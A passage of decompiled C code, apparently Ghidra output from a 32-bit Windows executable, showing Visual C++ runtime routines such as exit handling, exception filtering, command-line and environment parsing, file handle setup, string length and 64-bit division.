  DAT_00406a8c = (undefined)param_3;
  if (param_2 == 0) {
    if ((DAT_00407f70 != (code **)0x0) &&
       (ppcVar1 = (code **)(DAT_00407f6c - 4), DAT_00407f70 <= ppcVar1)) {
      do {
        if (*ppcVar1 != (code *)0x0) {
          (**ppcVar1)();
        }
        ppcVar1 = ppcVar1 + -1;
      } while (DAT_00407f70 <= ppcVar1);
    }
    FUN_00401bf8((undefined **)&DAT_00406018,(undefined **)&DAT_00406020);
  }
  FUN_00401bf8((undefined **)&DAT_00406024,(undefined **)&DAT_00406028);
  if (param_3 != 0) {
    return;
  }
  _DAT_00406a94 = 1;
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void __cdecl FUN_00401bf8(undefined **param_1,undefined **param_2)

{
  for (; param_1 < param_2; param_1 = (code **)param_1 + 1) {
    if ((code *)*param_1 != (code *)0x0) {
      (*(code *)*param_1)();
    }
  }
  return;
}



LONG __cdecl FUN_00401c12(int param_1,_EXCEPTION_POINTERS *param_2)

{
  code *pcVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  int *piVar4;
  LONG LVar5;
  int iVar6;
  undefined4 *puVar7;
  
  piVar4 = FUN_00401d53(param_1);
  uVar3 = DAT_00406a98;
  if ((piVar4 == (int *)0x0) || (pcVar1 = (code *)piVar4[2], pcVar1 == (code *)0x0)) {
    LVar5 = UnhandledExceptionFilter(param_2);
  }
  else if (pcVar1 == (code *)0x5) {
    piVar4[2] = 0;
    LVar5 = 1;
  }
  else {
    if (pcVar1 != (code *)0x1) {
      DAT_00406a98 = param_2;
      if (piVar4[1] == 8) {
        if (DAT_00406240 < DAT_00406244 + DAT_00406240) {
          iVar6 = (DAT_00406244 + DAT_00406240) - DAT_00406240;
          puVar7 = (undefined4 *)(DAT_00406240 * 0xc + 0x4061d0);
          do {
            *puVar7 = 0;
            puVar7 = puVar7 + 3;
            iVar6 = iVar6 + -1;
          } while (iVar6 != 0);
        }
        uVar2 = DAT_0040624c;
        iVar6 = *piVar4;
        if (iVar6 == -0x3fffff72) {
          DAT_0040624c = 0x83;
        }
        else if (iVar6 == -0x3fffff70) {
          DAT_0040624c = 0x81;
        }
        else if (iVar6 == -0x3fffff6f) {
          DAT_0040624c = 0x84;
        }
        else if (iVar6 == -0x3fffff6d) {
          DAT_0040624c = 0x85;
        }
        else if (iVar6 == -0x3fffff73) {
          DAT_0040624c = 0x82;
        }
        else if (iVar6 == -0x3fffff71) {
          DAT_0040624c = 0x86;
        }
        else if (iVar6 == -0x3fffff6e) {
          DAT_0040624c = 0x8a;
        }
        (*pcVar1)(8,DAT_0040624c);
        DAT_0040624c = uVar2;
      }
      else {
        piVar4[2] = 0;
        (*pcVar1)(piVar4[1]);
      }
    }
    LVar5 = -1;
    DAT_00406a98 = (_EXCEPTION_POINTERS *)uVar3;
  }
  return LVar5;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int * __cdecl FUN_00401d53(int param_1)

{
  int *piVar1;
  
  piVar1 = (int *)&DAT_004061c8;
  if (_DAT_004061c8 != param_1) {
    do {
      piVar1 = piVar1 + 3;
      if (&DAT_004061c8 + DAT_00406248 * 0xc <= piVar1) break;
    } while (*piVar1 != param_1);
  }
  if ((&DAT_004061c8 + DAT_00406248 * 0xc <= piVar1) || (*piVar1 != param_1)) {
    piVar1 = (int *)0x0;
  }
  return piVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

byte * FUN_00401d96(void)

{
  byte bVar1;
  int iVar2;
  byte *pbVar3;
  byte *pbVar4;
  
  if (_DAT_00407f68 == 0) {
    FUN_004030bb();
  }
  bVar1 = *DAT_00407f78;
  pbVar4 = DAT_00407f78;
  if (bVar1 == 0x22) {
    while( true ) {
      pbVar3 = pbVar4;
      bVar1 = pbVar3[1];
      pbVar4 = pbVar3 + 1;
      if ((bVar1 == 0x22) || (bVar1 == 0)) break;
      iVar2 = FUN_00402cb5(bVar1);
      if (iVar2 != 0) {
        pbVar4 = pbVar3 + 2;
      }
    }
    if (*pbVar4 == 0x22) goto LAB_00401dd3;
  }
  else {
    while (0x20 < bVar1) {
      bVar1 = pbVar4[1];
      pbVar4 = pbVar4 + 1;
    }
  }
  for (; (*pbVar4 != 0 && (*pbVar4 < 0x21)); pbVar4 = pbVar4 + 1) {
LAB_00401dd3:
  }
  return pbVar4;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00401dee(void)

{
  char cVar1;
  size_t sVar2;
  char **ppcVar3;
  char *pcVar4;
  int iVar5;
  char *pcVar6;
  
  if (_DAT_00407f68 == 0) {
    FUN_004030bb();
  }
  iVar5 = 0;
  for (pcVar6 = DAT_00406a40; *pcVar6 != '\0'; pcVar6 = pcVar6 + sVar2 + 1) {
    if (*pcVar6 != '=') {
      iVar5 = iVar5 + 1;
    }
    sVar2 = _strlen(pcVar6);
  }
  ppcVar3 = (char **)_malloc(iVar5 * 4 + 4);
  _DAT_00406a74 = ppcVar3;
  if (ppcVar3 == (char **)0x0) {
    __amsg_exit(9);
  }
  cVar1 = *DAT_00406a40;
  pcVar6 = DAT_00406a40;
  while (cVar1 != '\0') {
    sVar2 = _strlen(pcVar6);
    if (*pcVar6 != '=') {
      pcVar4 = (char *)_malloc(sVar2 + 1);
      *ppcVar3 = pcVar4;
      if (pcVar4 == (char *)0x0) {
        __amsg_exit(9);
      }
      FID_conflict___mbscpy(*ppcVar3,pcVar6);
      ppcVar3 = ppcVar3 + 1;
    }
    pcVar6 = pcVar6 + sVar2 + 1;
    cVar1 = *pcVar6;
  }
  FUN_004030d7(DAT_00406a40);
  DAT_00406a40 = (char *)0x0;
  *ppcVar3 = (char *)0x0;
  _DAT_00407f64 = 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00401ea7(void)

{
  byte **ppbVar1;
  byte *pbVar2;
  int local_c;
  int local_8;
  
  if (_DAT_00407f68 == 0) {
    FUN_004030bb();
  }
  GetModuleFileNameA((HMODULE)0x0,&DAT_00406a9c,0x104);
  _DAT_00406a84 = &DAT_00406a9c;
  pbVar2 = &DAT_00406a9c;
  if (*DAT_00407f78 != 0) {
    pbVar2 = DAT_00407f78;
  }
  FUN_00401f40(pbVar2,(byte **)0x0,(byte *)0x0,&local_8,&local_c);
  ppbVar1 = (byte **)_malloc(local_c + local_8 * 4);
  if (ppbVar1 == (byte **)0x0) {
    __amsg_exit(8);
  }
  FUN_00401f40(pbVar2,ppbVar1,(byte *)(ppbVar1 + local_8),&local_8,&local_c);
  _DAT_00406a68 = local_8 + -1;
  _DAT_00406a6c = ppbVar1;
  return;
}



void __cdecl FUN_00401f40(byte *param_1,byte **param_2,byte *param_3,int *param_4,int *param_5)

{
  byte bVar1;
  bool bVar2;
  bool bVar3;
  byte *pbVar4;
  byte *pbVar5;
  uint uVar6;
  byte **ppbVar7;
  
  *param_5 = 0;
  *param_4 = 1;
  if (param_2 != (byte **)0x0) {
    *param_2 = param_3;
    param_2 = param_2 + 1;
  }
  if (*param_1 == 0x22) {
    while( true ) {
      bVar1 = param_1[1];
      pbVar4 = param_1 + 1;
      if ((bVar1 == 0x22) || (bVar1 == 0)) break;
      if (((*(byte *)((int)&DAT_00406d20 + bVar1 + 1) & 4) != 0) &&
         (*param_5 = *param_5 + 1, param_3 != (byte *)0x0)) {
        *param_3 = *pbVar4;
        param_3 = param_3 + 1;
        pbVar4 = param_1 + 2;
      }
      *param_5 = *param_5 + 1;
      param_1 = pbVar4;
      if (param_3 != (byte *)0x0) {
        *param_3 = *pbVar4;
        param_3 = param_3 + 1;
      }
    }
    *param_5 = *param_5 + 1;
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    if (*pbVar4 == 0x22) {
      pbVar4 = param_1 + 2;
    }
  }
  else {
    do {
      *param_5 = *param_5 + 1;
      if (param_3 != (byte *)0x0) {
        *param_3 = *param_1;
        param_3 = param_3 + 1;
      }
      bVar1 = *param_1;
      pbVar4 = param_1 + 1;
      if ((*(byte *)((int)&DAT_00406d20 + bVar1 + 1) & 4) != 0) {
        *param_5 = *param_5 + 1;
        if (param_3 != (byte *)0x0) {
          *param_3 = *pbVar4;
          param_3 = param_3 + 1;
        }
        pbVar4 = param_1 + 2;
      }
      if (bVar1 == 0x20) break;
      if (bVar1 == 0) goto LAB_00401feb;
      param_1 = pbVar4;
    } while (bVar1 != 9);
    if (bVar1 == 0) {
LAB_00401feb:
      pbVar4 = pbVar4 + -1;
    }
    else if (param_3 != (byte *)0x0) {
      param_3[-1] = 0;
    }
  }
  bVar2 = false;
  ppbVar7 = param_2;
  while (*pbVar4 != 0) {
    for (; (*pbVar4 == 0x20 || (*pbVar4 == 9)); pbVar4 = pbVar4 + 1) {
    }
    if (*pbVar4 == 0) break;
    if (ppbVar7 != (byte **)0x0) {
      *ppbVar7 = param_3;
      ppbVar7 = ppbVar7 + 1;
      param_2 = ppbVar7;
    }
    *param_4 = *param_4 + 1;
    while( true ) {
      bVar3 = true;
      uVar6 = 0;
      for (; *pbVar4 == 0x5c; pbVar4 = pbVar4 + 1) {
        uVar6 = uVar6 + 1;
      }
      if (*pbVar4 == 0x22) {
        pbVar5 = pbVar4;
        if ((uVar6 & 1) == 0) {
          if ((!bVar2) || (pbVar5 = pbVar4 + 1, pbVar4[1] != 0x22)) {
            bVar3 = false;
            pbVar5 = pbVar4;
          }
          bVar2 = !bVar2;
          ppbVar7 = param_2;
        }
        uVar6 = uVar6 >> 1;
        pbVar4 = pbVar5;
      }
      for (; uVar6 != 0; uVar6 = uVar6 - 1) {
        if (param_3 != (byte *)0x0) {
          *param_3 = 0x5c;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      bVar1 = *pbVar4;
      if ((bVar1 == 0) || ((!bVar2 && ((bVar1 == 0x20 || (bVar1 == 9)))))) break;
      if (bVar3) {
        if (param_3 == (byte *)0x0) {
          if ((*(byte *)((int)&DAT_00406d20 + bVar1 + 1) & 4) != 0) {
            pbVar4 = pbVar4 + 1;
            *param_5 = *param_5 + 1;
          }
        }
        else {
          if ((*(byte *)((int)&DAT_00406d20 + bVar1 + 1) & 4) != 0) {
            *param_3 = bVar1;
            param_3 = param_3 + 1;
            pbVar4 = pbVar4 + 1;
            *param_5 = *param_5 + 1;
          }
          *param_3 = *pbVar4;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      pbVar4 = pbVar4 + 1;
    }
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
  }
  if (ppbVar7 != (byte **)0x0) {
    *ppbVar7 = (byte *)0x0;
  }
  *param_4 = *param_4 + 1;
  return;
}



undefined4 * FUN_004020f4(void)

{
  char cVar1;
  WCHAR WVar2;
  WCHAR *pWVar3;
  WCHAR *pWVar4;
  int iVar5;
  size_t _Size;
  undefined4 *puVar6;
  char *_Size_00;
  LPWCH lpWideCharStr;
  undefined4 *puVar8;
  undefined4 *local_8;
  undefined4 *puVar7;
  
  lpWideCharStr = (LPWCH)0x0;
  puVar8 = (undefined4 *)0x0;
  if (DAT_00406ba0 == 0) {
    lpWideCharStr = GetEnvironmentStringsW();
    if (lpWideCharStr != (LPWCH)0x0) {
      DAT_00406ba0 = 1;
LAB_0040214b:
      if ((lpWideCharStr == (LPWCH)0x0) &&
         (lpWideCharStr = GetEnvironmentStringsW(), lpWideCharStr == (LPWCH)0x0)) {
        return (undefined4 *)0x0;
      }
      WVar2 = *lpWideCharStr;
      pWVar4 = lpWideCharStr;
      while (WVar2 != L'\0') {
        do {
          pWVar3 = pWVar4;
          pWVar4 = pWVar3 + 1;
        } while (*pWVar4 != L'\0');
        pWVar4 = pWVar3 + 2;
        WVar2 = *pWVar4;
      }
      iVar5 = ((int)pWVar4 - (int)lpWideCharStr >> 1) + 1;
      _Size = WideCharToMultiByte(0,0,lpWideCharStr,iVar5,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0);
      local_8 = (undefined4 *)0x0;
      if (((_Size != 0) && (puVar8 = (undefined4 *)_malloc(_Size), puVar8 != (undefined4 *)0x0)) &&
         (iVar5 = WideCharToMultiByte(0,0,lpWideCharStr,iVar5,(LPSTR)puVar8,_Size,(LPCSTR)0x0,
                                      (LPBOOL)0x0), local_8 = puVar8, iVar5 == 0)) {
        FUN_004030d7(puVar8);
        local_8 = (undefined4 *)0x0;
      }
      FreeEnvironmentStringsW(lpWideCharStr);
      return local_8;
    }
    puVar8 = (undefined4 *)GetEnvironmentStrings();
    if (puVar8 == (undefined4 *)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_00406ba0 = 2;
  }
  else {
    if (DAT_00406ba0 == 1) goto LAB_0040214b;
    if (DAT_00406ba0 != 2) {
      return (undefined4 *)0x0;
    }
  }
  if ((puVar8 == (undefined4 *)0x0) &&
     (puVar8 = (undefined4 *)GetEnvironmentStrings(), puVar8 == (undefined4 *)0x0)) {
    return (undefined4 *)0x0;
  }
  cVar1 = *(char *)puVar8;
  puVar6 = puVar8;
  while (cVar1 != '\0') {
    do {
      puVar7 = puVar6;
      puVar6 = (undefined4 *)((int)puVar7 + 1);
    } while (*(char *)puVar6 != '\0');
    puVar6 = (undefined4 *)((int)puVar7 + 2);
    cVar1 = *(char *)puVar6;
  }
  _Size_00 = (char *)((int)puVar6 + (1 - (int)puVar8));
  puVar6 = (undefined4 *)_malloc((size_t)_Size_00);
  if (puVar6 == (undefined4 *)0x0) {
    puVar6 = (undefined4 *)0x0;
  }
  else {
    FUN_00403280(puVar6,puVar8,(uint)_Size_00);
  }
  FreeEnvironmentStringsA((LPCH)puVar8);
  return puVar6;
}



void FUN_00402226(void)

{
  HANDLE *ppvVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  DWORD DVar5;
  HANDLE hFile;
  HANDLE *ppvVar6;
  int iVar7;
  UINT UVar8;
  UINT UVar9;
  uint uVar10;
  _STARTUPINFOA local_44;
  
  puVar3 = (undefined4 *)_malloc(0x100);
  if (puVar3 == (undefined4 *)0x0) {
    __amsg_exit(0x1b);
  }
  DAT_00407f60 = 0x20;
  DAT_00407e60 = puVar3;
  for (; puVar3 < DAT_00407e60 + 0x40; puVar3 = puVar3 + 2) {
    *(undefined *)(puVar3 + 1) = 0;
    *puVar3 = 0xffffffff;
    *(undefined *)((int)puVar3 + 5) = 10;
  }
  GetStartupInfoA(&local_44);
  if ((local_44.cbReserved2 != 0) && ((UINT *)local_44.lpReserved2 != (UINT *)0x0)) {
    UVar8 = *(UINT *)local_44.lpReserved2;
    local_44.lpReserved2 = (LPBYTE)((int)local_44.lpReserved2 + 4);
    ppvVar6 = (HANDLE *)(UVar8 + (int)local_44.lpReserved2);
    if (0x7ff < (int)UVar8) {
      UVar8 = 0x800;
    }
    UVar9 = UVar8;
    if ((int)DAT_00407f60 < (int)UVar8) {
      puVar3 = &DAT_00407e64;
      do {
        puVar4 = (undefined4 *)_malloc(0x100);
        UVar9 = DAT_00407f60;
        if (puVar4 == (undefined4 *)0x0) break;
        DAT_00407f60 = DAT_00407f60 + 0x20;
        *puVar3 = puVar4;
        puVar2 = puVar4;
        for (; puVar4 < puVar2 + 0x40; puVar4 = puVar4 + 2) {
          *(undefined *)(puVar4 + 1) = 0;
          *puVar4 = 0xffffffff;
          *(undefined *)((int)puVar4 + 5) = 10;
          puVar2 = (undefined4 *)*puVar3;
        }
        puVar3 = puVar3 + 1;
        UVar9 = UVar8;
      } while ((int)DAT_00407f60 < (int)UVar8);
    }
    uVar10 = 0;
    if (0 < (int)UVar9) {
      do {
        if (((*ppvVar6 != (HANDLE)0xffffffff) && ((*local_44.lpReserved2 & 1) != 0)) &&
           (((*local_44.lpReserved2 & 8) != 0 || (DVar5 = GetFileType(*ppvVar6), DVar5 != 0)))) {
          ppvVar1 = (HANDLE *)((int)(&DAT_00407e60)[(int)uVar10 >> 5] + (uVar10 & 0x1f) * 8);
          *ppvVar1 = *ppvVar6;
          *(BYTE *)(ppvVar1 + 1) = *local_44.lpReserved2;
        }
        uVar10 = uVar10 + 1;
        local_44.lpReserved2 = (LPBYTE)((int)local_44.lpReserved2 + 1);
        ppvVar6 = ppvVar6 + 1;
      } while ((int)uVar10 < (int)UVar9);
    }
  }
  iVar7 = 0;
  do {
    ppvVar6 = (HANDLE *)(DAT_00407e60 + iVar7 * 2);
    if (DAT_00407e60[iVar7 * 2] == -1) {
      *(undefined *)(ppvVar6 + 1) = 0x81;
      if (iVar7 == 0) {
        DVar5 = 0xfffffff6;
      }
      else {
        DVar5 = 0xfffffff5 - (iVar7 != 1);
      }
      hFile = GetStdHandle(DVar5);
      if ((hFile != (HANDLE)0xffffffff) && (DVar5 = GetFileType(hFile), DVar5 != 0)) {
        *ppvVar6 = hFile;
        if ((DVar5 & 0xff) != 2) {
          if ((DVar5 & 0xff) == 3) {
            *(byte *)(ppvVar6 + 1) = *(byte *)(ppvVar6 + 1) | 8;
          }
          goto LAB_004023b7;
        }
      }
      *(byte *)(ppvVar6 + 1) = *(byte *)(ppvVar6 + 1) | 0x40;
    }
    else {
      *(byte *)(ppvVar6 + 1) = *(byte *)(ppvVar6 + 1) | 0x80;
    }
LAB_004023b7:
    iVar7 = iVar7 + 1;
    if (2 < iVar7) {
      SetHandleCount(DAT_00407f60);
      return;
    }
  } while( true );
}



undefined4 __cdecl FUN_004023d1(int param_1)

{
  int iVar1;
  
  DAT_00407e44 = HeapCreate((uint)(param_1 == 0),0x1000,0);
  if (DAT_00407e44 != (HANDLE)0x0) {
    iVar1 = FUN_004035b5();
    if (iVar1 != 0) {
      return 1;
    }
    HeapDestroy(DAT_00407e44);
  }
  return 0;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x402428,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release, Visual Studio 2003 Debug, Visual
// Studio 2003 Release

void __cdecl __local_unwind2(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack28;
  undefined *puStack24;
  undefined4 local_14;
  int iStack16;
  
  iStack16 = param_1;
  puStack24 = &LAB_00402430;
  uStack28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack28;
  while( true ) {
    iVar1 = *(int *)(param_1 + 8);
    iVar2 = *(int *)(param_1 + 0xc);
    if ((iVar2 == -1) || (iVar2 == param_2)) break;
    local_14 = *(undefined4 *)(iVar1 + iVar2 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_14;
    if (*(int *)(iVar1 + 4 + iVar2 * 0xc) == 0) {
      FUN_004024e6();
      (**(code **)(iVar1 + 8 + iVar2 * 0xc))();
    }
  }
  *in_FS_OFFSET = uStack28;
  return;
}



void FUN_004024e6(void)

{
  undefined4 in_EAX;
  int unaff_EBP;
  
  DAT_00406260 = in_EAX;
  DAT_00406264 = *(undefined4 *)(unaff_EBP + 8);
  DAT_00406268 = unaff_EBP;
  return;
}



void FUN_004025c5(int param_1)

{
  __local_unwind2(*(int *)(param_1 + 0x18),*(int *)(param_1 + 0x1c));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004025e0(void)

{
  if ((DAT_00406a48 == 1) || ((DAT_00406a48 == 0 && (_DAT_004061bc == 1)))) {
    FUN_00402619(0xfc);
    if (DAT_00406ba4 != (code *)0x0) {
      (*DAT_00406ba4)();
    }
    FUN_00402619(0xff);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00402619(DWORD param_1)

{
  char **ppcVar1;
  DWORD *pDVar2;
  DWORD DVar3;
  size_t sVar4;
  HANDLE hFile;
  int iVar5;
  CHAR *_Dest;
  char acStackY483 [3];
  undefined4 uStackY480;
  char *lpBuffer;
  LPOVERLAPPED lpOverlapped;
  CHAR local_1a8 [260];
  char local_a4 [160];
  
  iVar5 = 0;
  pDVar2 = &DAT_00406270;
  do {
    if (param_1 == *pDVar2) break;
    pDVar2 = pDVar2 + 2;
    iVar5 = iVar5 + 1;
  } while ((int)pDVar2 < 0x406300);
  if (param_1 == (&DAT_00406270)[iVar5 * 2]) {
    if ((DAT_00406a48 == 1) || ((DAT_00406a48 == 0 && (_DAT_004061bc == 1)))) {
      pDVar2 = &param_1;
      ppcVar1 = (char **)(iVar5 * 8 + 0x406274);
      lpOverlapped = (LPOVERLAPPED)0x0;
      sVar4 = _strlen(*ppcVar1);
      lpBuffer = *ppcVar1;
      hFile = GetStdHandle(0xfffffff4);
      WriteFile(hFile,lpBuffer,sVar4,pDVar2,lpOverlapped);
    }
    else if (param_1 != 0xfc) {
      DVar3 = GetModuleFileNameA((HMODULE)0x0,local_1a8,0x104);
      if (DVar3 == 0) {
        FID_conflict___mbscpy(local_1a8,"<program name unknown>");
      }
      _Dest = local_1a8;
      sVar4 = _strlen(local_1a8);
      if (0x3c < sVar4 + 1) {
        sVar4 = _strlen(local_1a8);
        _Dest = acStackY483 + sVar4;
        _strncpy(_Dest,"...",3);
      }
      FID_conflict___mbscpy(local_a4,"Runtime Error!\n\nProgram: ");
      FID_conflict__strcat(local_a4,_Dest);
      FID_conflict__strcat(local_a4,"\n\n");
      FID_conflict__strcat(local_a4,*(char **)(iVar5 * 8 + 0x406274));
      uStackY480 = 0x40273d;
      FUN_00403dfe(local_a4,"Microsoft Visual C++ Runtime Library",0x12010);
    }
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

DWORD __cdecl FUN_0040276c(uint param_1,LONG param_2,DWORD param_3)

{
  byte *pbVar1;
  HANDLE hFile;
  DWORD DVar2;
  uint uVar3;
  int iVar4;
  
  if (param_1 < DAT_00407f60) {
    iVar4 = (param_1 & 0x1f) * 8;
    if ((*(byte *)((&DAT_00407e60)[(int)param_1 >> 5] + 4 + iVar4) & 1) != 0) {
      hFile = (HANDLE)FUN_0040406f(param_1);
      if (hFile == (HANDLE)0xffffffff) {
        _DAT_00406a4c = 9;
        return 0xffffffff;
      }
      DVar2 = SetFilePointer(hFile,param_2,(PLONG)0x0,param_3);
      if (DVar2 == 0xffffffff) {
        uVar3 = GetLastError();
      }
      else {
        uVar3 = 0;
      }
      if (uVar3 != 0) {
        FUN_00403f8e(uVar3);
        return 0xffffffff;
      }
      pbVar1 = (byte *)((&DAT_00407e60)[(int)param_1 >> 5] + 4 + iVar4);
      *pbVar1 = *pbVar1 & 0xfd;
      return DVar2;
    }
  }
  _DAT_00406a4c = 9;
  _DAT_00406a50 = 0;
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __cdecl FUN_00402806(DWORD param_1,char *param_2,uint param_3)

{
  int *piVar1;
  byte bVar2;
  char cVar3;
  char *pcVar4;
  char *pcVar5;
  BOOL BVar6;
  int iVar7;
  char local_418 [1028];
  int local_14;
  DWORD local_10;
  DWORD local_c;
  char *local_8;
  
  if (param_1 < DAT_00407f60) {
    piVar1 = &DAT_00407e60 + ((int)param_1 >> 5);
    iVar7 = (param_1 & 0x1f) * 8;
    bVar2 = *(byte *)(*piVar1 + 4 + iVar7);
    if ((bVar2 & 1) != 0) {
      local_c = 0;
      local_14 = 0;
      if (param_3 == 0) {
        return 0;
      }
      if ((bVar2 & 0x20) != 0) {
        FUN_0040276c(param_1,0,2);
      }
      if ((*(byte *)((HANDLE *)(*piVar1 + iVar7) + 1) & 0x80) == 0) {
        BVar6 = WriteFile(*(HANDLE *)(*piVar1 + iVar7),param_2,param_3,&local_10,(LPOVERLAPPED)0x0);
        if (BVar6 == 0) {
          param_1 = GetLastError();
        }
        else {
          local_c = local_10;
          param_1 = 0;
        }
LAB_004028ff:
        if (local_c != 0) {
          return local_c - local_14;
        }
        if (param_1 != 0) {
          if (param_1 == 5) {
            _DAT_00406a4c = 9;
            _DAT_00406a50 = 5;
            return -1;
          }
          FUN_00403f8e(param_1);
          return -1;
        }
      }
      else {
        local_8 = param_2;
        param_1 = 0;
        if (param_3 != 0) {
          do {
            pcVar5 = local_418;
            do {
              if (param_3 <= (uint)((int)local_8 - (int)param_2)) break;
              pcVar4 = local_8 + 1;
              cVar3 = *local_8;
              local_8 = pcVar4;
              if (cVar3 == '\n') {
                local_14 = local_14 + 1;
                *pcVar5 = '\r';
                pcVar5 = pcVar5 + 1;
              }
              *pcVar5 = cVar3;
              pcVar5 = pcVar5 + 1;
            } while ((int)pcVar5 - (int)local_418 < 0x400);
            BVar6 = WriteFile(*(HANDLE *)(*piVar1 + iVar7),local_418,(int)pcVar5 - (int)local_418,
                              &local_10,(LPOVERLAPPED)0x0);
            if (BVar6 == 0) {
              param_1 = GetLastError();
              goto LAB_004028ff;
            }
            local_c = local_c + local_10;
            if (((int)local_10 < (int)pcVar5 - (int)local_418) ||
               (param_3 <= (uint)((int)local_8 - (int)param_2))) goto LAB_004028ff;
          } while( true );
        }
      }
      if (((*(byte *)(*piVar1 + 4 + iVar7) & 0x40) != 0) && (*param_2 == '\x1a')) {
        return 0;
      }
      _DAT_00406a4c = 0x1c;
      _DAT_00406a50 = 0;
      return -1;
    }
  }
  _DAT_00406a4c = 9;
  _DAT_00406a50 = 0;
  return -1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_004029b3(undefined4 *param_1)

{
  void *pvVar1;
  
  _DAT_00406ba8 = _DAT_00406ba8 + 1;
  pvVar1 = _malloc(0x1000);
  param_1[2] = pvVar1;
  if (pvVar1 == (void *)0x0) {
    param_1[3] = param_1[3] | 4;
    param_1[2] = param_1 + 5;
    param_1[6] = 2;
  }
  else {
    param_1[3] = param_1[3] | 8;
    param_1[6] = 0x1000;
  }
  param_1[1] = 0;
  *param_1 = param_1[2];
  return;
}



byte __cdecl FUN_004029f7(uint param_1)

{
  if (DAT_00407f60 <= param_1) {
    return 0;
  }
  return *(byte *)((&DAT_00407e60)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 0x40;
}



// Library Function - Single Match
//  _strlen
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_00402b33;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_00402b33:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

LPSTR __cdecl FUN_00402b5b(LPSTR param_1,WCHAR param_2)

{
  LPSTR pCVar1;
  
  pCVar1 = param_1;
  if (param_1 == (LPSTR)0x0) {
    return param_1;
  }
  if (DAT_00406bc4 == 0) {
    if ((ushort)param_2 < 0x100) {
      *param_1 = (CHAR)param_2;
      return (LPSTR)0x1;
    }
  }
  else {
    param_1 = (LPSTR)0x0;
    pCVar1 = (LPSTR)WideCharToMultiByte(DAT_00406bd4,0x220,&param_2,1,pCVar1,DAT_00406a28,
                                        (LPCSTR)0x0,(LPBOOL)&param_1);
    if ((pCVar1 != (LPSTR)0x0) && (param_1 == (LPSTR)0x0)) {
      return pCVar1;
    }
  }
  _DAT_00406a4c = 0x2a;
  return (LPSTR)0xffffffff;
}



// Library Function - Single Match
//  __aulldiv
// 
// Library: Visual Studio

undefined8 __aulldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __aullrem
// 
// Library: Visual Studio

